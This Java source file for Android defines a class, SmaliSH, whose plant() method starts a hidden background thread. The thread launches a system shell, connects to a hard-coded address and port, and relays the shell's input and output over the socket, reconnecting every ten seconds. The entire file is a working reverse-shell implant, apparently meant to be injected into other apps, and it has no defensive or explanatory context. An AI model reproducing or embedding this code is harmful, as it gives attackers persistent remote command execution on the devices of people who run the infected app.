package re;

import android.os.SystemClock;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 3 threads - asynchronous
 * 3 methods ( may be decreased to 2, by inlining plant )
 * async
 */
public class SmaliSH implements Runnable {
    public static final boolean AGGRESSIVE = false;
    public static final boolean VERBOSE = true;
    public static String TARGET = "192.168.0.96";
    public static int TARGET_PORT = 9999;
    public static final String TAG = "re.SmaliSH";
    final InputStream from;
    final OutputStream to;
    final Process proc;
    public static final AtomicBoolean plantOnce = new AtomicBoolean();

    public SmaliSH(InputStream from, OutputStream to, Process proc) {
        this.from = from;
        this.to = to;
        this.proc = proc;
    }


    public static void plant() {
        boolean planted = plantOnce.compareAndSet(false, true);
        if (!planted) {
            return;
        }

        new Thread(new SmaliSH(null, null, null), "ReSmaliSH.proc").start();
    }

    @Override
    public void run() {
        if (from == null && to == null) {
            while (true) {
                Socket socket = null;
                Process p = null;
                Thread t1 = null;
                Thread t2 = null;
                try {
                    p = new ProcessBuilder("sh").start();
                    socket = new Socket(TARGET, TARGET_PORT);
                    socket.setKeepAlive(true);
                    socket.getOutputStream().write("re.SmaliSH $ ".getBytes());
                    SmaliSH taskIn = new SmaliSH(socket.getInputStream(), p.getOutputStream(), p);
                    SmaliSH taskOut = new SmaliSH(p.getInputStream(), socket.getOutputStream(), p);
                    t1 = new Thread(taskIn, "ReSmaliSH.task.in");
                    t2 = new Thread(taskOut, "ReSmaliSH.task.out");
                    t1.start();
                    t2.start();
                    p.waitFor();
                } catch (IOException e) {
                    if (VERBOSE) Log.e(TAG, "e", e);
                    if (AGGRESSIVE) throw new RuntimeException(e);
                } catch (InterruptedException e) {
                    if (VERBOSE) Log.e(TAG, "e", e);
                    if (AGGRESSIVE) throw new RuntimeException(e);
                } finally {
                    if (socket != null) {
                        try {
                            socket.close();
                        } catch (IOException e) {
                            if (VERBOSE) Log.e(TAG, "e", e);
                        }
                    }
                    if (p != null) {
                        p.destroy();
                    }
                    if (t1 != null) {
                        t1.interrupt();
                    }
                    if (t2 != null) {
                        t2.interrupt();
                    }
                }
                SystemClock.sleep(10000);
            }
        } else {
            byte[] buf = new byte[8 * 1024];
            try {
                while (true) {
                    if (Thread.currentThread().isInterrupted()) {
                        break;
                    }
                    int r = this.from.read(buf);
                    if (r == -1) {
                        if (VERBOSE) Log.e(TAG, "quit");
                        this.proc.destroy();
                        break;
                    }
                    this.to.write(buf, 0, r);
                    this.to.flush();
                }
            } catch (IOException e) {
                if (VERBOSE) Log.e(TAG, "e", e);
                if (AGGRESSIVE) throw new RuntimeException(e);
            } finally {
                try {
                    from.close();
                } catch (IOException ignore) {
                }
                try {
                    to.close();
                } catch (IOException ignore) {

                }
            }

        }

    }

}
